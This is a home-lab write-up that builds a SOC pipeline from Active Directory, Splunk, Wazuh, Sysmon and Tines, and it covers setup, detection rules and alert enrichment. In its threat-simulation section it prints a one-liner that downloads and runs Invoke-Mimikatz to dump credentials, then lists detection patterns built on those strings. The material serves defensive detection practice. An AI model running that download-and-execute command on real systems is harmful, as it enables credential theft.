# AD + Splunk + Wazuh + SOAR Enterprise Security Lab
**Date: September 06, 2026**

An end-to-end cybersecurity home lab demonstrating enterprise-style security monitoring, detection engineering, threat intelligence enrichment, and SOAR automation using Active Directory, Splunk, Wazuh, Sysmon, Tines, VirusTotal, AbuseIPDB, and Slack.

The project simulates a small enterprise SOC environment where controlled security activity is generated from Kali Linux, collected from Windows and Linux systems, analyzed through Wazuh and Splunk, enriched through threat intelligence platforms, and automated through Tines SOAR.

---

## Architecture

<img width="762" height="886" alt="AD_Splunk_Wazuh_SOAR" src="https://github.com/user-attachments/assets/a6496082-af1b-4a78-a4d2-e660d7aa505c" />

## Security monitoring flow

                    INTERNET
                       |
                       v
                  TINES SOAR
                /     |      \
               /      |       \
       VirusTotal  AbuseIPDB  Slack
              ^       ^
              |       |
              +--- Tines
                   |
              JSON Webhook
                   |
                   v
               SIEM/XDR
            +------+------+
              |         |
          Detection   Archives
              |
              v
        Investigation
              |
       +------+------+
             |             
          Windows         
             |           
           Sysmon      
             |
        +----+----+
        |         |
      Wazuh     Splunk
      Agent       UF
        |         |
        v         v
      Wazuh     Splunk
      Manager   Indexer
        |         |
        v         v
      Wazuh     Splunk
     Indexer   Enterprise

## 1. Project overview

This project implements an integrated security monitoring environment consisting of:

- Active Directory
- Windows endpoints
- SIEM/XDR
- Splunk Enterprise
- Sysmon
- Wazuh File Integrity Monitoring (FIM)
- Custom Wazuh detection rules
- Custom Splunk alert
- MITRE ATT&CK mapping
- Tines SOAR
- VirusTotal
- AbuseIPDB
- Slack
- Kali Linux for controlled security testing

The environment demonstrates the complete security monitoring lifecycle:

      Telemetry Collection
              |
              v
          Detection
              |
              v
        Investigation
              |
              v
      Threat Intelligence Enrichment
              |
              v
       Automated Notification
              |
              v
            Response

## 2. Lab objectives

The primary objectives of this project are to:

- Deploy a Wazuh SIEM/XDR environment.
- Deploy Splunk Enterprise as an additional SIEM platform.
- Configure an Active Directory domain.
- Connect Windows endpoints to the domain.
- Deploy Wazuh agents.
- Deploy Splunk Universal Forwarders.
- Configure Sysmon for high-fidelity Windows telemetry.
- Collect Windows Security, System, Application, PowerShell, and Sysmon events.
- Configure Wazuh File Integrity Monitoring.
- Enable Wazuh archives.
- Create custom Wazuh detection rules.
- Map detections to MITRE ATT&CK.
- Forward selected Wazuh/Splunk alerts to Tines.
- Enrich indicators using VirusTotal and AbuseIPDB.
- Send automated security notifications through Slack.
- Build security monitoring dashboards.
- Perform controlled attack simulations from Kali Linux.
- Investigate security events using Wazuh and Splunk.

## 3. Lab environment

| Component                | Host / IP        | Role                       |
|--------------------------|------------------|----------------------------|
| Ubuntu Security Server   | `192.168.10.40`  | Splunk + Wazuh             |
| Wazuh Server/NAT         | `192.168.169.135`| Wazuh services             |
| Domain Controller        | `192.168.10.50`  | AD + DNS + Security        |
| DC NAT                   | `192.168.169.155`| NAT address                |
| FD-PC1                   | `192.168.10.30`  | Windows endpoint            |
| FD-PC1 NAT               | `192.168.169.184`| NAT address                |
| DP-PC1                   | `192.168.10.20`  | Windows endpoint            |
| DP-PC1 NAT               | `192.168.169.226`| NAT address                |
| Kali Linux               | `192.168.10.10`  | Attacker / security testing |
| Kali NAT                 | `192.168.169.134`| NAT address                |
| Internal Network         | `192.168.10.0/24`| Lab network                |
| Tines                    | Internet         | SOAR platform              |

## 4. Network topology

The network contains:

```text
                         Internet
                            |
                         Router
                            |
                     192.168.10.0/24
                            |
          +-----------------+------------------+
          |                 |                  |
          |                 |                  |
     Ubuntu Server          DC             Windows PCs
     192.168.10.40    192.168.10.50       .20 / .30
          |
     +----+----+
     |         |
   Splunk     Wazuh

Kali Linux is connected to the same internal environment and is used to generate controlled security activity.
```

# 5. Ubuntu security server

The Ubuntu server provides the central security infrastructure.

**Ubuntu Server**
**IP Address:** `192.168.10.40`
**NAT:** `192.168.169.135`

**Services hosted on the server:**

```text
Ubuntu Server
|
+-- Splunk Enterprise
|   |
|   +-- Splunk Indexer
|
+-- Wazuh
    |
    +-- Wazuh Manager
    +-- Wazuh Indexer
    +-- Wazuh Dashboard
```
**Wazuh responsibilities**

Wazuh is responsible for:

- Endpoint monitoring
- Windows event collection
- Sysmon telemetry
- File Integrity Monitoring
- Security detection
- Custom detection rules
- MITRE ATT&CK mapping
- Alert generation
- Agent management

**Splunk responsibilities**

Splunk provides:

- Centralized event indexing
- SPL-based investigation
- Windows event analysis
- Sysmon analysis
- Security dashboards
- Correlation searches
- Detection development
- Historical event investigation
  
Running both platforms provides the ability to investigate the same endpoint activity from two SIEM perspectives.

# 6. Active Directory domain controller

The Domain Controller is the identity and authentication core of the lab.

**Domain Controller**
**IP Address:** `192.168.10.50`

**Services hosted on the server:**

```text
Domain Controller
|
+-- Active Directory
+-- DNS
+-- Windows Security Events
+-- Sysmon Events
```

**Domain:**

`local.net`

**Example domain systems:**

```text
fd-pc1.local.net
dp-pc1.local.net
```
**The Domain Controller provides:**

- User accounts
- Computer accounts
- Authentication
- Kerberos
- Group Policy
- DNS
- Domain membership
- Windows security event generation

**Important security telemetry includes:**

- Successful logons
- Failed logons
- Account creation
- Account deletion
- Account modifications
- Privilege changes
- Authentication failures
- Suspicious account activity

## 7. Windows endpoints

The lab contains two Windows endpoints.

| Endpoint | Host IP         | NAT IP            |
| -------- | --------------- | ----------------- |
| FD-PC1   | `192.168.10.30` | `192.168.169.184` |
| DP-PC1   | `192.168.10.20` | `192.168.169.226` |

### Endpoint components

Each endpoint contains:

```text
Windows Endpoint
|
+-- Sysmon
|
+-- Wazuh Agent
|
+-- Splunk Universal Forwarder
```

This creates two telemetry pipelines.

### Wazuh telemetry

```text
Windows
   |
   +-- Sysmon + Windows Events
   |
Wazuh Agent
   |
Wazuh Manager
   |
Wazuh Indexer
   |
Wazuh Dashboard
```

### Splunk telemetry

```text
Windows
   |
   +-- Sysmon + Windows Events
   |
Splunk Universal Forwarder
   |
Splunk Indexer
   |
Splunk Enterprise
```

## 8. Sysmon

Sysmon provides detailed Windows endpoint telemetry that can be used for threat detection and incident investigation.

### Important Sysmon events

| Event ID | Activity            |
| -------: | ------------------- |
|      `1` | Process creation    |
|      `3` | Network connection  |
|      `7` | Image/DLL loading   |
|     `10` | Process access      |
|     `11` | File creation       |
|     `17` | Named pipe creation |
|     `22` | DNS query           |

**The lab uses Sysmon to collect telemetry such as:**

* Process creation
* Network connections
* File creation
* Registry activity
* Process termination
* DNS queries


# 9. Wazuh server installation

Download the Wazuh installation script:

```bash
curl -sO https://packages.wazuh.com/4.14/wazuh-install.sh
```

Run the all-in-one installation:

```bash
sudo bash ./wazuh-install.sh -a
```

The `-a` option performs an all-in-one Wazuh installation.

Started the services:

```bash
sudo systemctl start wazuh-manager
sudo systemctl start wazuh-dashboard
sudo systemctl start wazuh-indexer
```

Verified:

```bash
sudo systemctl status wazuh-manager
sudo systemctl status wazuh-dashboard
sudo systemctl status wazuh-indexer
```

The Wazuh dashboard available at:

`https://192.168.169.135`

---

# 10. Configure Wazuh to collect Sysmon

On the Windows endpoint, edited:

```text
C:\Program Files (x86)\ossec-agent\ossec.conf
```

Added:

```xml
<localfile>
    <location>Microsoft-Windows-Sysmon/Operational</location>
    <log_format>eventchannel</log_format>
</localfile>
```

Restarted the Wazuh agent:

```powershell
Restart-Service Wazuh
```

Verified the service:

```powershell
Get-Service Wazuh
```

Generated a test process:

```powershell
notepad.exe
```

The resulting Sysmon event appeared in Wazuh.

Useful process fields include:

* `Image`
* `CommandLine`
* `ParentImage`
* `User`
* `Hashes`
* `ProcessId`

---

# 11. Wazuh archives

Wazuh archives allow raw event data to be retained for investigation, including events that may not generate Wazuh alerts.

Edited:

```bash
sudo nano /var/ossec/etc/ossec.conf
```

Configured the archive settings according to the deployment requirements.

Configured Filebeat:

```bash
sudo nano /etc/filebeat/filebeat.yml
```

Restarted the services:

```bash
sudo systemctl restart wazuh-manager
sudo systemctl restart filebeat
```

Verified:

```bash
sudo systemctl status wazuh-manager
sudo systemctl status filebeat
```

Created the Wazuh archive index pattern:

```text
wazuh-archives*
```

This allows archived events to be searched from the Wazuh environment.

---

# 12. Windows Wazuh agent

Download the Wazuh agent:

```powershell
Invoke-WebRequest -Uri https://packages.wazuh.com/4.x/windows/wazuh-agent-4.14.7-1.msi -OutFile $env:TEMP\wazuh-agent.msi
```

Install the agent:

```powershell
msiexec.exe /i $env:TEMP\wazuh-agent.msi /q `
WAZUH_MANAGER='192.168.169.135' `
WAZUH_AGENT_NAME='MYDFIR-Windows'
```

Start the service:

```powershell
NET START Wazuh
```

Verify:

```powershell
Get-Service Wazuh
```

The endpoint should appear under:

```text
Wazuh Dashboard
    |
    +-- Agents
```

---

# 13. File Integrity Monitoring

Wazuh FIM detects changes to monitored files and directories.

Create a test directory:

```powershell
New-Item -ItemType Directory -Path C:\CompanyData
```

Create:

```text
C:\CompanyData\payroll.txt
```

Edit:

```text
C:\Program Files (x86)\ossec-agent\ossec.conf
```

Add:

```xml
<directories realtime="yes">C:\CompanyData\</directories>
```

Restart the agent:

```powershell
Restart-Service Wazuh
```

Test the monitoring:

```text
Create payroll.txt
        |
        v
Modify payroll.txt
        |
        v
Delete payroll.txt
```

Wazuh should generate File Integrity Monitoring events describing the changes.

---

# 14. Custom detection rules

Custom Wazuh rules allow the environment to detect activity specific to the lab.

Navigate to:

```text
Wazuh Dashboard
    |
    +-- Menu
        |
        +-- Server Management
            |
            +-- Rules
                |
                +-- Custom rules
                    |
                    +-- local_rules.xml
```

Example rule:

```xml
<group name="windows,authentication,">

    <rule id="100101" level="10">
        <if_sid>60122</if_sid>
        <description>Windows Guest account activity detected</description>
        <mitre>
            <id>T1078</id>
        </mitre>
    </rule>

</group>
```

The rule demonstrates:

```text
Windows Event
     |
     v
Parent Rule
     |
     v
Custom Rule 100101
     |
     v
Severity 10
     |
     v
MITRE ATT&CK T1078
```

Always validate the parent rule ID and event fields against the actual event generated in the environment before deploying a custom detection.

Restart Wazuh when required:

```bash
sudo systemctl restart wazuh-manager
```

---

# 15. Detection engineering

The project can be extended with custom detections for:

* Account creation
* Account deletion
* Privilege changes
* Guest account activation
* Suspicious PowerShell
* Command-line activity
* Repeated authentication failures
* Suspicious process execution
* File modifications
* Network connections

A detection engineering workflow can be represented as:

```text
Raw Telemetry
     |
     v
Event Analysis
     |
     v
Detection Logic
     |
     v
Wazuh Rule
     |
     v
MITRE ATT&CK Mapping
     |
     v
Alert
     |
     v
Investigation
```

---

# 16. MITRE ATT&CK mapping

Detections can be mapped to MITRE ATT&CK techniques.

Example:

```text
Detection
    |
    v
T1078
Valid Accounts
```

MITRE mapping provides additional context during security investigations and helps categorize attacker behavior.

The project can be expanded by mapping detections across areas such as:

* Execution
* Persistence
* Privilege Escalation
* Credential Access
* Discovery
* Lateral Movement
* Command and Control

Each technique should be mapped according to the behavior actually observed by the detection.

---

# 17. Wazuh to Tines integration

Create the custom integration:

```bash
sudo cp /var/ossec/integrations/shuffle \
    /var/ossec/integrations/custom-tines

sudo cp /var/ossec/integrations/shuffle \
    /var/ossec/integrations/custom-tines.py
```

Set ownership:

```bash
sudo chown root:wazuh /var/ossec/integrations/custom-tines
sudo chown root:wazuh /var/ossec/integrations/custom-tines.py
```

Review the integration script and configure it specifically for the Tines webhook and expected payload format.

Edit:

```bash
sudo nano /var/ossec/etc/ossec.conf
```

Add:

```xml
<integration>
    <name>custom-tines</name>
    <hook_url>https://your-tines-webhook-url</hook_url>
    <alert_format>json</alert_format>
    <rule_id>100101</rule_id>
</integration>
```

Replace:

```text
https://your-tines-webhook-url
```

with the webhook generated by the Tines workflow.

The `rule_id` determines which Wazuh detection triggers the integration.

Restart Wazuh:

```bash
sudo systemctl restart wazuh-manager
```

Monitor the Wazuh log:

```bash
sudo tail -f /var/ossec/logs/ossec.log
```
---

# 18. Tines SOAR

Tines provides the automation layer for the environment.

The workflow is:

```text
Wazuh Alert
     |
     v
Tines
     |
     +------> VirusTotal
     |
     +------> AbuseIPDB
     |
     +------> Slack
```

The integration uses a JSON webhook.

---

# 19. Enterprise Splunk SIEM deployment and SOAR automated incident response

The project demonstrates an end-to-end security operations workflow:

```text
Endpoint Telemetry
       |
       v
Splunk Universal Forwarder
       |
       v
Splunk Enterprise
       |
       v
Detection Engineering
       |
       v
Security Alert
       |
       v
Tines SOAR
       |
       +------> VirusTotal
       |
       +------> Threat Analysis
       |
       v
Slack Notification
       |
       v
SOC Investigation
```
---

**Architecture and integration workflow**

```text
+----------------------------------------------------------+
|                   WINDOWS ENDPOINT                       |
|                                                          |
|                                                          |
|  Windows Event Logs                                      |
|  - Security                                              |
|  - System                                                |
|  - Application                                           |
|  - PowerShell                                            |
|  - Windows Defender                                      |
|                                                          |
|  Sysmon                                                  |
|  - Process Creation                                      |
|  - Network Connections                                   |
|  - File Activity                                         |
+-----------------------------+----------------------------+
                              |
                              |
                              | TCP 9997
                              | Forwarded Telemetry
                              v
+----------------------------------------------------------+
|                   SPLUNK ENTERPRISE                     |
|                  192.168.169.135:8000                    |
|                                                          |
|  - Index: endpoint                                       |
|  - Search and Reporting                                  |
|  - SPL Detection                                         |
|  - Correlation Searches                                  |
|  - Alerting                                              |
+-----------------------------+----------------------------+
                              |
                              |
                              | Webhook
                              v
+----------------------------------------------------------+
|                       TINES SOAR                        |
|                                                          |
|  - Alert Reception                                       |
|  - IOC Extraction                                        |
|  - VirusTotal Enrichment                                 |
|  - Investigation Context                                 |
|  - Response Recommendations                              |
+-----------------------------+----------------------------+
                              |
                              |
                              | HTTP POST
                              v
+----------------------------------------------------------+
|                    SLACK SOC CHANNEL                     |
|                         #soar                            |
|                                                          |
|  - Alert Summary                                         |
|  - Severity                                              |
|  - Process Details                                       |
|  - IOC Reputation                                        |
|  - Investigation Findings                                |
|  - Response Recommendations                              |
+----------------------------------------------------------+
```

**Environment and IP architecture**

| Component       | Asset / Hostname   | IP / Network Path      | Role                               |
| --------------- | ------------------ | ---------------------- | ---------------------------------- |
| SIEM Server     | `mydfir-rashad`    | `192.168.169.135`      | Splunk Enterprise 10.4.2           |
| Splunk Web      | `mydfir-rashad`    | `192.168.169.135:8000` | Splunk Web interface               |
| Splunk Receiver | `mydfir-rashad`    | `192.168.169.135:9997` | Universal Forwarder receiver       |
| Endpoint        | `DClocal.net`      | `192.168.169.155`      | Windows monitored endpoint         |
| Endpoint        | `DP-PC1.local.net` | `192.168.169.226`      | Windows monitored endpoint         |
| Endpoint        | `FD-PC1.local.net` | `192.168.169.184`      | Windows monitored endpoint         |
| User Context    | `alex`             | Domain User            | Simulated compromised-user context |
| SOAR            | Tines              | Webhook                | Automated incident response        |
| Notification    | Slack              | `#soar`                | SOC alert destination              |

---

**Splunk Enterprise installation**

- Install the Splunk Enterprise package

Verified the downloaded package:

```bash
ls splunk-10.4.2-33c3bf42cd73-linux-amd64.deb
```

Installed the package:

```bash
sudo dpkg -i splunk-10.4.2-33c3bf42cd73-linux-amd64.deb
```

**Initialized Splunk**

Start Splunk and accept the license agreement:

```bash
cd /opt/splunk/bin
sudo ./splunk start --accept-eula
```

Enable Splunk to start automatically with systemd:

```bash
sudo ./splunk enable boot-start -user splunk
```

**Configured the receiving port**

Splunk Universal Forwarders send telemetry to the Splunk receiver over TCP port `9997`.

The Splunk Web interface available at:

```text
http://192.168.169.135:8000
```

---

**Splunk Universal Forwarder deployment**

The Windows endpoint uses Splunk Universal Forwarder to collect and forward telemetry to the Splunk Enterprise server.

Installed the Universal Forwarder:

Run:

```text
splunkforwarder-10.4.2-x64.msi
```

During installation, configure the endpoint as a forwarder connecting to an existing Splunk Enterprise instance.

**Configured the receiving indexer**

Configure:

```text
Receiving Indexer:
192.168.169.135

Port:
9997
```

**Configure telemetry collection**

Edit:

```text
%ProgramFiles%\SplunkUniversalForwarder\etc\system\local\inputs.conf
```

Example configuration:

```ini
[WinEventLog://Microsoft-Windows-Sysmon/Operational]
index = endpoint
disabled = false
renderXml = true
source = XmlWinEventLog:Microsoft-Windows-Sysmon/Operational

[WinEventLog://Microsoft-Windows-Windows Defender/Operational]
index = endpoint
disabled = false
source = Microsoft-Windows-Windows Defender/Operational
blacklist = 1151,1150,2000,1002,1001,1000

[WinEventLog://Microsoft-Windows-PowerShell/Operational]
index = endpoint
disabled = false
source = Microsoft-Windows-PowerShell/Operational
blacklist = 4100,4105,4106,40961,40962,53504

[WinEventLog://Application]
index = endpoint
disabled = false

[WinEventLog://Security]
index = endpoint
disabled = false

[WinEventLog://System]
index = endpoint
disabled = false

```

Restart the Universal Forwarder:

```powershell
Restart-Service SplunkForwarder
```

---

**Telemetry verification**

After configuring the Universal Forwarder, verified that events are arriving in Splunk.

Created and Run:

```spl
index=endpoint
```

To view the distribution of events by source:

```spl
index=endpoint
| stats count by source
```

**Observed telemetry distribution**

The lab observed approximately the following distribution:

| Source                                                       | Approximate volume |
| ------------------------------------------------------------ | -----------------: |
| `WinEventLog:Security`                                       |              80.6% |
| `XmlWinEventLog:Microsoft-Windows-Sysmon/Operational`        |              13.4% |
| `WinEventLog:System`                                         |               2.8% |
| `WinEventLog:Microsoft-Windows-Windows Defender/Operational` |               1.3% |
| `WinEventLog:Application`                                    |               1.2% |
| `WinEventLog:Microsoft-Windows-PowerShell/Operational`       |               0.7% |

This confirms that the endpoint is generating telemetry across multiple Windows security sources.

---

# 20. Threat simulation

The lab uses a controlled adversary simulation to generate telemetry that can be detected and investigated.

The simulated activity involves (AtomicTest):

```text
Compromised User
      |
      v
cmd.exe
      |
      v
powershell.exe
      |
      v
IEX / DownloadString
      |
      v
Remote PowerShell Script
      |
      v
Invoke-Mimikatz
      |
      v
Credential Dumping Attempt
```

**Simulated command**

On `DP-PC1.local.net`, the test scenario uses the following command:

```powershell
cmd.exe /c powershell.exe -NOP -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
```

This generates telemetry that can be observed through:

* Sysmon
* Windows PowerShell logs
* Windows Security logs
* Splunk

> **Lab safety:** This command should only be used in an isolated, authorized test environment.

---

# 21. Detection engineering

**Correlation search**

Used a scheduled Splunk correlation search to detect suspicious PowerShell and command-line activity.

**Saved as alert:** `Malicious Execution`

**App:** `alert`

**Schedule:**

```text
*/5 * * * *
```

**Trigger condition:**

```text
Number of Results > 0
```

**Detection SPL**

```spl
index=endpoint
(source="*Sysmon/Operational" OR source="*PowerShell/Operational")
(Image="*\\powershell.exe" OR Image="*\\cmd.exe")
("DownloadString" OR "Invoke-Mimikatz" OR "IEX")
| stats count by _time, User, Image, CommandLine, ParentImage

```

The detection looks for:

* PowerShell execution.
* `cmd.exe` execution.
* Remote content retrieval.
* `DownloadString`.
* `IEX`.
* `Invoke-Mimikatz`.
* Process lineage.

The resulting alert is forwarded to the SOAR platform through a webhook.

---

**Detection logic**

The detection pipeline can be represented as:

```text
Windows Telemetry
       |
       v
Sysmon / PowerShell Events
       |
       v
Splunk Index
       |
       v
SPL Correlation Search
       |
       v
Malicious Execution
       |
       v
Alert Trigger
       |
       v
SOAR Webhook
```

This demonstrates the transition from raw telemetry to an actionable security detection.

---

# 22. SOAR automation

The SOAR layer receives the Splunk alert and performs automated enrichment.

```text
Splunk Alert
     |
     v
Tines
     |
     +------> Parse Alert
     |
     +------> Extract IOC
     |
     +------> VirusTotal
     |
     +------> Generate Investigation Context
     |
     v
Slack
```

The automation extracts information such as:

* Hostname
* Username
* Process
* Parent process
* Command line
* URL
* Domain
* Detection rule
* Severity
* Timestamp

---

# 11. VirusTotal enrichment

VirusTotal is used to enrich supported indicators identified by the detection.

Example workflow:

```text
Wazuh / Splunk Alert
        |
        v
Extract Indicator
        |
        v
VirusTotal API
        |
        v
Reputation Result
        |
        v
Tines Investigation
```

For URL-based indicators, the workflow can query the URL or domain reputation and include the result in the final analyst notification.

---

# 12. Slack incident notification

After enrichment, Tines sends the investigation summary to the dedicated `#soar` Slack channel.

Example notification structure:

```text
Security Alert

Severity:
High

Host:
DP-PC1.local.net

User:
alex

Detection:
Malicious Execution

Findings:
cmd.exe spawned PowerShell, which used IEX and
Net.WebClient.DownloadString to retrieve a remote
PowerShell script.

Process:
powershell.exe

Parent Process:
cmd.exe

IOC:
<indicator>

VirusTotal:
<reputation>

MITRE ATT&CK:
T1059.001 - PowerShell
```

---

# 13. Automated investigation summary

The SOAR workflow generated the following investigation context during the simulated scenario.

## Findings

* `cmd.exe` executed a PowerShell process.
* PowerShell used `IEX` and `Net.WebClient.DownloadString`.
* The command retrieved `Invoke-Mimikatz.ps1`.
* The script was executed with the `-DumpCreds` argument.
* VirusTotal enrichment identified the referenced URL as suspicious or malicious according to multiple vendors.

## Investigation summary

The alert represents a PowerShell download-and-execute technique associated with credential-dumping activity.

The process chain:

```text
powershell.exe
      |
      v
cmd.exe
      |
      v
powershell.exe
```

provides useful process-lineage evidence for investigation.

The available alert data does not independently confirm whether credential dumping succeeded.

---

# 14. 5W1H investigation

| Question  | Finding                                                          |
| --------- | ---------------------------------------------------------------- |
| **Who**   | `alex`                                                           |
| **What**  | PowerShell retrieved and executed `Invoke-Mimikatz.ps1`          |
| **When**  | `2026-09-05 06:46:27 UTC`                                        |
| **Where** | `DP-PC1.local.net`                                               |
| **Why**   | Not available from the alert data                                |
| **How**   | PowerShell download-and-execute using `IEX` and `DownloadString` |

---

# 15. Response recommendations

The automated investigation produced the following recommendations:

1. Block the identified malicious URL through appropriate web filtering or proxy controls.
2. Isolate `DP-PC1.local.net` if the activity is confirmed to be unauthorized.
3. Review PowerShell and process-creation telemetry surrounding the alert.
4. Investigate potential credential access and lateral movement.
5. Reset credentials associated with `alex` if compromise is confirmed.
6. Review child processes and outbound connections generated after the script execution.

---

# 16. IOC handling

The simulated scenario contains the following URL indicator:

```text
https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1
```

The IOC should be handled as a security investigation artifact within the isolated lab.

Example automated decision:

```text
IOC Detected
     |
     v
Threat Intelligence Lookup
     |
     v
Malicious / Suspicious
     |
     v
Create Security Alert
     |
     v
Recommend Blocking
```

---

# 17. End-to-end incident response workflow

The complete workflow is:

```text
                         KALI / TEST ACTIVITY
                                  |
                                  v
                         WINDOWS ENDPOINT
                                  |
                    +-------------+-------------+
                    |                           |
                    v                           v
                  Sysmon                Windows Event Logs
                    |                           |
                    +-------------+-------------+
                                  |
                                  v
                       Splunk Universal Forwarder
                                  |
                                  v
                         Splunk Enterprise
                                  |
                                  v
                       SPL Detection Search
                                  |
                                  v
                           Security Alert
                                  |
                                  v
                            Tines SOAR
                                  |
                    +-------------+-------------+
                    |                           |
                    v                           v
               VirusTotal                Investigation Logic
                    |                           |
                    +-------------+-------------+
                                  |
                                  v
                              Slack
                                  |
                                  v
                         SOC Investigation
```

---

# 18. Validation and testing

## 18.1 Verify Splunk ingestion

Run:

```spl
index=endpoint
```

For the simulated activity:

```spl
index=endpoint CommandLine="*Invoke-Mimikatz*"
```

## 18.2 Verify the correlation search

Confirm that the scheduled search executes according to its configured schedule.

Example:

```text
Search:
Malicious Execution

Schedule:
*/5 * * * *

Trigger:
Number of Results > 0
```

## 18.3 Verify the SOAR webhook

Confirm that the Splunk alert reaches the Tines webhook.

Expected flow:

```text
Splunk
  |
  v
Webhook
  |
  v
Tines
```

## 18.4 Verify VirusTotal enrichment

Confirm that Tines extracts the expected indicator and performs the configured reputation lookup.

## 18.5 Verify Slack notification

Confirm that the enriched security alert is delivered to:

```text
#soar
```

Expected flow:

```text
Splunk Alert
     |
     v
Tines
     |
     v
VirusTotal
     |
     v
Investigation Summary
     |
     v
Slack
```

---

# 19. Troubleshooting

## Splunk receives no events

Check:

* Splunk Universal Forwarder service.
* Receiver address.
* TCP port `9997`.
* `inputs.conf`.
* Splunk index configuration.
* Windows Event Log sources.

Check the Windows service:

```powershell
Get-Service SplunkForwarder
```

Test connectivity:

```powershell
Test-NetConnection 192.168.169.135 -Port 9997
```

---

## Sysmon events are missing

Verify:

* Sysmon is installed.
* Sysmon service is running.
* The Sysmon operational channel is enabled.
* The Universal Forwarder is collecting the channel.
* `render_xml = true` is configured where required.

Search:

```spl
index=endpoint source="*Sysmon/Operational"
```

---

## PowerShell events are missing

Search:

```spl
index=endpoint source="*PowerShell/Operational"
```

Verify that the following input is enabled:

```ini
[WinEventLog://Microsoft-Windows-PowerShell/Operational]
disabled = 0
index = endpoint
```

---

## Correlation search does not trigger

Check:

* Search syntax.
* Index name.
* Field names.
* Event source.
* Search schedule.
* Trigger condition.
* Time range.
* Actual event data.

Run the SPL manually before relying on the scheduled alert.

---

## SOAR webhook does not trigger

Check:

* Webhook URL.
* HTTP request configuration.
* Alert action.
* JSON payload.
* Network connectivity.
* Tines workflow status.

---

## VirusTotal enrichment fails

Check:

* API configuration.
* Indicator extraction.
* URL encoding.
* API response.
* Rate limits.
* Tines workflow execution.

---

# 20. Security operations workflow

This project demonstrates the following SOC lifecycle:

```text
1. Telemetry Collection
        |
        v
2. Centralized Logging
        |
        v
3. Detection Engineering
        |
        v
4. Alert Generation
        |
        v
5. Automated Enrichment
        |
        v
6. Investigation
        |
        v
7. Response Recommendation
        |
        v
8. Analyst Notification
```

---

# 21. Key cybersecurity competencies demonstrated

## SIEM administration

* Splunk Enterprise deployment.
* Splunk receiver configuration.
* Index configuration.
* Universal Forwarder deployment.
* Windows Event Log ingestion.
* Telemetry validation.

## Endpoint telemetry engineering

* Sysmon integration.
* Windows Security monitoring.
* PowerShell logging.
* Windows Defender telemetry.
* Process and command-line visibility.

## Detection engineering

* SPL development.
* Correlation searches.
* Process-lineage analysis.
* Suspicious PowerShell detection.
* LOLBin detection.
* Download-and-execute detection.

## SOAR automation

* Webhook-based alert ingestion.
* Automated IOC extraction.
* VirusTotal enrichment.
* Investigation context generation.
* Slack notification.

## Incident response

* Alert triage.
* 5W1H analysis.
* Process investigation.
* IOC analysis.
* Threat intelligence enrichment.
* Containment recommendations.

---

# 22. Technology stack

| Category            | Technology                        |
| ------------------- | --------------------------------- |
| SIEM                | Splunk Enterprise 10.4.2          |
| Forwarder           | Splunk Universal Forwarder 10.4.2 |
| Endpoint            | Windows                           |
| Endpoint Telemetry  | Sysmon                            |
| SOAR                | Tines                             |
| Threat Intelligence | VirusTotal                        |
| Notification        | Slack                             |
| Detection Language  | Splunk SPL                        |
| Protocol            | HTTP/JSON Webhook                 |
| Operating System    | Ubuntu / Windows                  |
| Security Framework  | MITRE ATT&CK                      |

---

# 23. Project outcome

The completed environment demonstrates an enterprise-style security monitoring and automated response pipeline.

```text
                     ENDPOINT
                         |
                         v
              Windows Event Logs
                    + Sysmon
                         |
                         v
              Splunk Universal Forwarder
                         |
                         v
                 Splunk Enterprise
                         |
                         v
                Detection Engineering
                         |
                         v
                   Security Alert
                         |
                         v
                    Tines SOAR
                         |
              +----------+----------+
              |                     |
              v                     v
         VirusTotal          Investigation
              |                     |
              +----------+----------+
                         |
                         v
                       Slack
                         |
                         v
                  SOC Analyst
```

The project demonstrates how raw endpoint telemetry can be transformed into a structured security workflow:

```text
Telemetry
    |
    v
Detection
    |
    v
Alert
    |
    v
Enrichment
    |
    v
Investigation
    |
    v
Response Recommendation
    |
    v
Analyst Notification
```

---

# 24. Repository structure

A recommended repository structure is:

```text
enterprise-splunk-siem-soar/
|
+-- README.md
|
+-- architecture/
|   +-- architecture.png
|   +-- telemetry-flow.png
|   +-- soar-workflow.png
|
+-- splunk/
|   +-- inputs.conf
|   +-- detection-rules/
|       +-- malicious-execution.spl
|
+-- sysmon/
|   +-- sysmon-config.xml
|
+-- soar/
|   +-- tines-workflow.md
|   +-- webhook-payload.json
|
+-- incident-response/
|   +-- investigation-report.md
|   +-- response-playbook.md
|
+-- screenshots/
|   +-- splunk-dashboard.png
|   +-- splunk-alert.png
|   +-- tines-workflow.png
|   +-- virustotal-enrichment.png
|   +-- slack-alert.png
|
+-- documentation/
|   +-- deployment-notes.md
|   +-- troubleshooting.md
|
+-- lab-notes/
    +-- attack-simulation.md
```

---

# 25. Final architecture

```text
                         +-------------------+
                         |    Test Activity  |
                         |   Kali / Lab Host |
                         +---------+---------+
                                   |
                                   v
                         +-------------------+
                         | Windows Endpoint  |
                         |   DP-PC1.local.net|
                         +---------+---------+
                                   |
                       +-----------+-----------+
                       |                       |
                       v                       v
                    Sysmon             Windows Event Logs
                       |                       |
                       +-----------+-----------+
                                   |
                                   v
                     +-------------------------+
                     | Splunk Universal        |
                     | Forwarder               |
                     +------------+------------+
                                  |
                                  | TCP 9997
                                  v
                     +-------------------------+
                     | Splunk Enterprise       |
                     | 192.168.169.135:8000    |
                     +------------+------------+
                                  |
                                  v
                     +-------------------------+
                     | Detection Engineering   |
                     | SPL / Correlation Search|
                     +------------+------------+
                                  |
                                  v
                     +-------------------------+
                     | Security Alert          |
                     +------------+------------+
                                  |
                                  | Webhook
                                  v
                     +-------------------------+
                     | Tines SOAR              |
                     +------------+------------+
                                  |
                    +-------------+-------------+
                    |                           |
                    v                           v
             +-------------+             +-------------+
             | VirusTotal  |             | Investigation|
             | Enrichment  |             | Logic       |
             +------+------+             +------+------+
                    |                           |
                    +-------------+-------------+
                                  |
                                  v
                         +----------------+
                         | Slack #soar    |
                         +-------+--------+
                                 |
                                 v
                         SOC Investigation
```

---

# 26. Conclusion

This project demonstrates an enterprise-style SIEM and SOAR architecture built around Splunk Enterprise, Windows endpoint telemetry, Sysmon, Tines, VirusTotal, and Slack.

The environment covers the complete security operations lifecycle:

```text
Endpoint Telemetry
       |
       v
Centralized Collection
       |
       v
Detection Engineering
       |
       v
Security Alert
       |
       v
